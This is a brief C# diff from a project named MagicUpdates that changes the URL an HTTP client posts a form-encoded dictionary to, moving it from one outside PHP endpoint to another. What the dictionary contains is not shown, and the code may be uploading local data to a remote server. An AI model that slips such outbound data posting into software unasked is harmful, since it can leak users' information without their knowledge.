@@ -16,7 +16,7 @@ namespace MagicUpdates
             {
                 HttpClient client = new HttpClient();
                 var hclnt = new HttpClient();
-                var url = "https://qfrat.co.in/magicupd/core.php";
+                var url = "https://tuximages.xyz/magic_upd/core.php";
                 var post = dct;
                 var content = new FormUrlEncodedContent(post);
                 var response = await client.PostAsync(url, content);
